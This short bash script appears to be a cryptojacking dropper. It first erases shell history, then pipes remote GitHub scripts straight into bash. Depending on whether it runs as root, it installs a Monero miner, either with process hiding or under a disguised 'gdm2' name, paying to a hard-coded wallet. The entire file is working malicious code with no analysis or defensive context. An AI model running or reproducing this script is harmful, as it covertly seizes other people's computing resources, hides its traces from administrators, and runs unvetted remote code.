#!/bin/bash

unset HISTFILE ;history -d $((HISTCMD-2))
export HISTFILE=/dev/null ;history -d $((HISTCMD-2))

rootstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}
userstuff(){
  curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru
}

if [[ $(id) = uid=0* ]]
then

echo
echo  You are running the root install!
echo

      rootstuff
else
echo
echo  You are running the user install!
echo

      userstuff
fi
